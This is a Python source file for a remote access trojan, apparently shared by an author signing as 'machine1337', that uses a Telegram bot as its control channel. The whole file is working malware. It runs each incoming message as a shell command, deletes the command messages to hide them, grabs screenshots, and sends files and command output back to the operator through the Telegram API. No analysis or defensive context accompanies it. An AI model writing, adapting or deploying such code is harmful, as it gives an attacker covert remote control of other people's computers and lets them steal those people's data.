import os
import platform
import requests
import subprocess
import time
from PIL import ImageGrab

TOKEN = ''   #change the token here
CHAT_ID = ''   #change the chat id here
processed_message_ids = []
def get_updates(offset=None):
    url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
    params = {'offset': offset, 'timeout': 60}
    response = requests.get(url, params=params)
    if response.status_code == 200:
        data = response.json()
        return data.get('result', [])
    else:
        return []


def delete_message(message_id):
    url = f"https://api.telegram.org/bot{TOKEN}/deleteMessage"
    params = {'chat_id': CHAT_ID, 'message_id': message_id}
    response = requests.get(url, params=params)
    
#coded by machine1337
def execute_command(command):
    if command == 'ss':
        file_path = "screenshot.png"
        try:
            screenshot = ImageGrab.grab()
            screenshot.save(file_path)
            send_file(file_path)
            os.remove(file_path)
            return "Sent."
        except Exception as e:
            return f"Error: {e}"
    else:
        try:
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            return result.decode('utf-8').strip()  
        except subprocess.CalledProcessError as e:
            return f"Command execution failed. Error: {e.output.decode('utf-8').strip()}"


def send_file(filename):
    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
    with open(filename, 'rb') as file:
        files = {'document': file}
        data = {'chat_id': CHAT_ID}
        response = requests.post(url, data=data, files=files)

def handle_updates(updates):
    highest_update_id = 0
    for update in updates:
        if 'message' in update and 'text' in update['message']:
            message_text = update['message']['text']
            message_id = update['message']['message_id']
            if message_id in processed_message_ids:
                continue
            processed_message_ids.append(message_id)
            delete_message(message_id)
            result = execute_command(message_text)
            if result:
                send_message(result)
        update_id = update['update_id']
        if update_id > highest_update_id:
            highest_update_id = update_id
    return highest_update_id
def send_message(text):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    params = {
        'chat_id': CHAT_ID,
        'text': text
    }
    response = requests.get(url, params=params)
    
def main():
    offset = None
    while True:
        updates = get_updates(offset)
        if updates:
            offset = handle_updates(updates) + 1
            processed_message_ids.clear()
        time.sleep(1)
if __name__ == '__main__':
    main()
#coded by machine1337. Don't copy this code
